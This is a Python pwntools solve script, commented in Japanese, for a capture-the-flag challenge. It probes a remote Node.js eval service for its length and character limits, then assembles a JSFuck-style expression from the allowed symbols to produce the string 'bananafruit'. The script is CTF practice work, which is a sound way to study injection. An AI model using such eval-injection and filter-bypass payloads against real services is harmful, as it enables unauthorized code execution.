from pwn import *
import re

context.log_level = "warn"

# node.js で eval("...").toString().toLowerCase() が動いてそう


def send(password):
    io = remote("apples-and-oranges-25b1895e82ba.tcp.1753ctf.com", 12827)
    io.sendline(password.encode())
    return io.recvall()


def evaluate(password):
    res = send(password)
    return re.findall(r"Password (.*) nicht", res.decode())[0]


def is_allowed(password):
    res = send(password)
    return b"input ist unallowed!" not in res


# ***************************************************************************
# 送信可能な長さを調べる
# ***************************************************************************
# 二分探索
# ok = 3
# ng = 200
# while ng - ok > 1:
#     mid = (ok + ng) // 2
#     if b"too lange!" in send("!" * (mid - 2) + "[]"):
#         ng = mid
#     else:
#         ok = mid
#     print(mid)
max_length = 184


# ***************************************************************************
# 送信可能な文字列を調べる
# ***************************************************************************
# allowed = []
# for c in range(32, 127):
#     if is_allowed(chr(c)):
#         allowed.append(chr(c))
#         print(chr(c))

# print("".join(allowed))
allowed = " !()+[]{}"
# 一般的な jsfuck との違いは " {}" の存在


# ***************************************************************************
# bananafruit を作る
# ***************************************************************************
dictionary = {
    "[object object]": "({}+[])",
    "NaN": "(+{})",  # これ自体は文字列じゃないので、文字列と足し合わせる必要あり。ba "nan" afruit に利用する
    "true": "([]+[]+!![])",
    "false": "(![]+[])",
    "undefined": "([]+[]+[][[]])",
}

b = dictionary["[object object]"] + "[2]"
a = dictionary["false"] + "[1]"
nan = dictionary["NaN"]
f = dictionary["false"] + "[0]"
r = dictionary["true"] + "[1]"
u = dictionary["undefined"] + "[0]"
i = dictionary["undefined"] + "[5]"
t = dictionary["true"] + "[0]"

bananafruit = "+".join([b, a, nan, a, f, r, u, i, t])

bananafruit = (
    bananafruit.replace("0", "+[]")
    .replace("1", "+!+[]")
    .replace("2", "+!+[]" * 2)
    .replace("5", "+!+[]" * 5)
)

print(bananafruit)
print(len(bananafruit))
